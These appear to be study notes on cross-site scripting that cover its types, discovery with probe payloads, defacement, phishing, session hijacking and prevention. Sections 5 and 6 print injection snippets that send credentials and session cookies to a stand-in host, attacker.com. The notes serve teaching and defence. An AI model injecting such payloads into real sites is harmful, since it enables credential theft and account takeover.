## **1. Introduction to XSS**

- **Cross-Site Scripting (XSS)** is a web vulnerability that allows attackers to inject malicious scripts into web applications.
- These scripts are executed in a victim’s browser and can steal data, modify content, or perform other malicious actions.
- XSS is categorized into three types: **Stored XSS, Reflected XSS, and DOM-based XSS**.

---

## **2. Types of XSS Vulnerabilities**

### **A. Stored XSS (Persistent XSS)**

- Malicious scripts are permanently stored on a website (e.g., in a database, forum post, comment section).
- The script executes whenever a user visits the affected page.
- **Example Attack:** Injecting a `<script>` tag into a comment field that steals cookies.

### **B. Reflected XSS (Non-Persistent XSS)**

- The malicious script is embedded in a URL and executed when a victim clicks on the link.
- The server reflects the input without proper sanitization.
- **Example Attack:** A phishing email with a malicious URL that executes JavaScript when clicked.

### **C. DOM-based XSS**

- The attack manipulates the **DOM (Document Object Model)** of a webpage using JavaScript.
- The vulnerability occurs on the client side rather than the server.
- **Example Attack:** JavaScript modifying `document.URL` to inject a script.

---

## **3. XSS Discovery Techniques**

- **Manual Testing:** Inspect website input fields, URLs, and parameters for injection points.
- **Automated Tools:**
    - **Burp Suite** (Active Scanner)
    - **OWASP ZAP**
    - **XSS Hunter**
- **Payload Testing:**
    - `<script>alert(1)</script>`
    - `<img src=x onerror=alert(1)>`
    - `<svg onload=alert(1)>`

---

## **4. Defacing Attacks**

- **Goal:** Modify the appearance of a website using XSS.
- Attackers inject JavaScript to:
    - Change text, images, or styles.
    - Redirect users to a fake site.
    - Display offensive messages.

**Example:**

```html
<script>
document.body.innerHTML = "<h1>Hacked by XYZ</h1>";
</script>
```

---

## **5. Phishing Attacks using XSS**

- **Goal:** Steal login credentials by injecting a fake login form.
- **Techniques:**
    - Use XSS to replace the login form with a phishing form.
    - Redirect users to an attacker-controlled page.

**Example:**

```html
<script>
document.body.innerHTML = '<form action="http://attacker.com/steal" method="POST">Username: <input type="text" name="user"><br>Password: <input type="password" name="pass"><br><input type="submit"></form>';
</script>
```

**Mitigation:** Use **Content Security Policy (CSP)** and **same-origin policies**.

---

## **6. Session Hijacking via XSS**

- **Goal:** Steal a user's session cookie and impersonate them.
- **Technique:** Inject JavaScript to extract the session cookie and send it to an attacker.

**Example Attack:**

```html
<script>
document.location="http://attacker.com/steal?cookie="+document.cookie;
</script>
```

**Mitigation:**

- Use **HttpOnly** cookies (prevents JavaScript access).
- Implement **SameSite** attributes in cookies.
- Use **session expiration** mechanisms.

---

## **7. Preventing XSS in Front-end & Back-end**

### **Front-end Protections:**

✅ Escape user input before rendering (`innerText` instead of `innerHTML`).  
✅ Use **Content Security Policy (CSP)** to restrict script execution.  
✅ Implement **input validation** (e.g., allowlist input fields).

### **Back-end Protections:**

✅ Use **output encoding** (e.g., `htmlspecialchars()` in PHP, `html.escape()` in Python).  
✅ Implement **HTTPOnly cookies** to prevent cookie theft.  
✅ Use **security headers** (e.g., `X-XSS-Protection`, `CSP`).

---

## **Conclusion**

- XSS is a major security risk that can lead to data theft, defacement, phishing, and session hijacking.
- Attackers exploit XSS by injecting malicious JavaScript.
- Developers must implement both **front-end and back-end** security measures to prevent XSS attacks.

---

